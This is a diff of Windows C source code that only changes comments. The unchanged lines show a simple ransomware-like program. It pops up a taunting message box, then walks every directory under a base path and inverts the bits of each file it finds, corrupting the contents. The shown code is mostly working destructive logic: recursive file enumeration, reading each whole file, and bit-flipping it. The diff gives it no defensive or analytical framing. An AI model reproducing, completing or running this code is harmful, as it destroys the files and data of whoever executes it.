@@ -8,7 +8,7 @@
 void traverseAndEncrypt(char *basePath);
 void crypt(char *filePath);
 int message(void)
-{
+{ //windows api messagebox yeah
     int result = MessageBoxW(
         NULL,
         L"dont brag about reaching the peak when its a fucking iceberg",
@@ -36,7 +36,7 @@ int main(void) {
 
         // Start traversing and encrypting
         traverseAndEncrypt(buffer);
-        break;
+        break; //if OK is pressed the encryption happens and the message box popup loop stops
     }
     }
     return 0;
@@ -46,7 +46,7 @@ int main(void) {
 void traverseAndEncrypt(char *basePath) {
     WIN32_FIND_DATA fileData;
     char searchPath[1024];
-    snprintf(searchPath, sizeof(searchPath), "%s\\*", basePath);  // Add wildcard for directory search
+    snprintf(searchPath, sizeof(searchPath), "%s\\*", basePath);  // add wildcard for directory search
 
     HANDLE hFind = FindFirstFile(searchPath, &fileData);
     if (hFind == INVALID_HANDLE_VALUE) {
@@ -64,10 +64,10 @@ void traverseAndEncrypt(char *basePath) {
         snprintf(fullPath, sizeof(fullPath), "%s\\%s", basePath, fileData.cFileName);
 
         if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            // If it's a directory, recursively traverse it
+            // if it's a directory traverse it
             traverseAndEncrypt(fullPath);
         } else {
-            // Otherwise, encrypt the file
+            // if its a file, encrypt it
             crypt(fullPath);
         }
     } while (FindNextFile(hFind, &fileData) != 0);
@@ -85,7 +85,7 @@ void crypt(char *filePath) {
     }
 
     fseek(readFile, 0, SEEK_END);  // Get file size
-    long fileSize = ftell(readFile);
+    long fileSize = ftell(readFile);// basically get the amount of characters in a file
     fseek(readFile, 0, SEEK_SET);
 
     if (fileSize == 0) {  // Skip empty files
@@ -94,7 +94,7 @@ void crypt(char *filePath) {
         return;
     }
 
-    char *content = (char *)malloc(fileSize);
+    char *content = (char *)malloc(fileSize); //alocate memory for the content
     if (!content) {
         printf("Error: Memory allocation failed for file: %s\n", filePath);
         fclose(readFile);
@@ -104,7 +104,7 @@ void crypt(char *filePath) {
     size_t bytesRead = fread(content, 1, fileSize, readFile);
     fclose(readFile);
 
-    // Flip bits of the file content
+    // flip bits of the file content
     for (size_t i = 0; i < bytesRead; i++) {
         content[i] = ~content[i];
     }
